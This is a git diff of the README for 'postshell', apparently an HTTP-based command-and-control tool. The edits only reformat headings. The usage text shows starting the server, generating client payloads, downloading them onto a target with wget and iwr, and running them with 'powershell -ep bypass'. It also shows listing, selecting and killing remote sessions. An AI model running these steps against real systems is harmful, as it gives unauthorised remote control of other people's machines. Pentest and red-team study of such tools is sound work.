@@ -47,12 +47,12 @@ git clone https://github.com/bwithe/postshell
 ```
 
 # Usage
-To start the server
+## Start the server
 ```
 python3 postshell.py <port>
 ```
 
-List commands
+## List commands
 ```
 postshell> help 
 
@@ -80,7 +80,8 @@ Payload Menu Commands:
 
 ```
 
-Generate a Client script that creates a directory called "tools" with the scripts
+##  Generate a Client scripts
+  - This creates a directory called "tools" with the scripts
   - This server also allows `GET` requests from `tools/`
   - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
 ```
@@ -123,14 +124,14 @@ payload> generate
 [+] Payload generated and saved as 'tools/client.ps1'
 ```
 
-Transfer the client script
+## Transfer the client scripts
 ```
 wget http://127.0.0.1/tools/client.sh
 
 iwr http://127.0.0.1/tools/client.ps1 -outfile client.ps1
 ```
 
-Execute the script on the client
+## Execute the script on the client
 ```
 bash client.sh
 
@@ -139,7 +140,7 @@ python3 client.py
 powershell -ep bypass client.ps1
 ```
 
-To see active clients
+## List active clients
 ```
 postshell> list 
 ╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
@@ -162,13 +163,13 @@ postshell> list
 
 ```
 
-To connect to an active session
+## Connect to an active session
 ```
 postshell> select 1
 [luke@SKYWALKER]> 
 ```
 
-Execute commands, and wait for the client to GET the command, then POST the results
+## Execute commands, and wait for the client to GET the command, then POST the results
 ```
 [luke@SKYWALKER]> pwd
 
@@ -178,30 +179,30 @@ C:\Users\Luke
 
 ```
   
-Background a session
+## Background a session
 ```
 [luke@SKYWALKER]> background
 ```
 
-Kill the current session
+## Kill the current session
 ```
 [chewie@WOOKIE]> die 
 [!] Sent die command to chewie@WOOKIE
 ```
 
-Kill an active session from the menu
+## Kill an active session from the menu
 ```
 postshell> kill 1
 [!] Sent kill command to luke@SKYWALKER
 ```
 
-Kill all sessions
+## Kill all sessions
 ```
 postshell> killall
 [!] Terminating all sessions.
 ```
 
-Exit POSTSHELL
+## Exit POSTSHELL
 ```
 postshell> exit 
 [!] Shutting down server and all sessions.
